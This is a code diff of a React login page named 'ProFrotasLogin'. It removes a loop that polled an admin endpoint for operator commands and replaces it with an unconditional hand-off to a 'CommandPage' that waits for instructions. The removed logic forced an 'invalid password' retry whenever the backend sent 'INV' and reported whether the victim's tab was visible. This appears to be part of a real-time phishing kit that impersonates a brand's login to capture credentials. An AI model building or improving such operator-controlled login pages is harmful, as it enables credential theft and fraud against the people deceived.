@@ -11,8 +11,6 @@ function ProFrotasLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [hasError, setHasError] = useState(false);
-  const [lastProcessedTimestamp, setLastProcessedTimestamp] = useState(null);
-  const [currentCommand, setCurrentCommand] = useState(null);
   const [emailNotified, setEmailNotified] = useState(false);
   const emailDebounceRef = useRef(null);
   const [showFaleConosco, setShowFaleConosco] = useState(false);
@@ -119,37 +117,8 @@ function ProFrotasLogin() {
     }
   };
 
-  // Polling de comandos
-  useEffect(() => {
-    if (!userId) return;
-    const poll = async () => {
-      try {
-        const v = document.hidden ? "0" : "1";
-        const response = await axios.get(`${API}/user/check-action/${userId}?visible=${v}`);
-        if (response.data?.action) {
-          const { action, action_timestamp: timestamp } = response.data;
-          if (timestamp && timestamp === lastProcessedTimestamp) return;
-          if (action === "INV") {
-            setIsLoading(false);
-            setHasError(true);
-            setPassword("");
-            setStep(2);
-            setLastProcessedTimestamp(timestamp);
-            axios.post(`${API}/admin/command`, { user_id: userId, command: "CLEAR" }).catch(() => {});
-          } else if (action !== "CLEAR") {
-            setCurrentCommand(action);
-            setLastProcessedTimestamp(timestamp);
-          }
-        }
-      } catch (e) {}
-    };
-    poll();
-    const interval = setInterval(poll, 1500);
-    return () => clearInterval(interval);
-  }, [userId, lastProcessedTimestamp]);
-
-  // Se tem comando, importar CommandPage dinamicamente
-  if (currentCommand && currentCommand !== "INV" && userId) {
+  // Após login, mostrar CommandPage (ou AGUARDE se nenhum comando ainda)
+  if (userId) {
     const CommandPage = require("@/pages/CommandPage").default;
     return <CommandPage userId={userId} />;
   }
